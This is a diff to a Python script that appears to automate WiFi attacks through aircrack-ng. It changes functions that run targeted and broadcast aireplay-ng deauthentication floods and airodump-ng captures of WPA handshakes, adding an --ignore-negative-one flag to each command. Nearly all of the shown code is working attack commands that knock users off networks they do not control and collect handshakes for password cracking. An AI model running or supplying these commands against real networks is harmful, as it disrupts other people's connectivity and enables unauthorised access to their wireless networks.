@@ -251,13 +251,13 @@ def aircrackng():
                         os.system('clear')
                         input("\n\033[1;33;48m[?] \033[0;37;48mPRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! [press enter]>>" %(d))
                         os.system("iwconfig %s channel %s" %(index,c))
-                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s -c %s %s;airodump-ng -w %s -c %s --bssid %s %s" %(e,d,g,index,b,c,d,index))
+                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one;airodump-ng -w %s -c %s --bssid %s --ignore-negative-one %s" %(e,d,g,index,b,c,d,index))
                         post_frame()
                     def broadcast_deauth():
                         os.system('clear')
                         input("\n\033[1;33;48m[?] \033[0;37;48mPRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! \n[press enter]>>" %(d))
                         os.system("iwconfig %s channel %s" %(index,c))
-                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s %s;airodump-ng -w %s -c %s --bssid %s %s" %(e,d,index,b,c,d,index))
+                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s %s --ignore-negative-one;airodump-ng -w %s -c %s --bssid %s --ignore-negative-one %s" %(e,d,index,b,c,d,index))
                         post_frame()
                     def no_deauth():
                         os.system('clear')
@@ -265,7 +265,7 @@ def aircrackng():
                         print("\033[1;34;48m[info] \033[0;36;48mYou need to wait for someone to connect or connect manually yourself")
                         input("\033[1;34;48m[info] \033[0;33;48mReady? Hit enter to run. When you see WPA HANDSHAKE:%s at the top right press ctrl+c>>" %(d))
                         os.system("\niwconfig %s channel %s" %(index,c))
-                        os.system("\nairodump-ng -w %s -c %s --bssid %s %s" %(b,c,d,index))
+                        os.system("\nairodump-ng -w %s -c %s --bssid %s --ignore-negative-one %s" %(b,c,d,index))
                         post_frame()
                     if e != "" and g != "":
                         standard()
@@ -334,4 +334,3 @@ def title():
             pass
         os._exit(1)
 title()
-
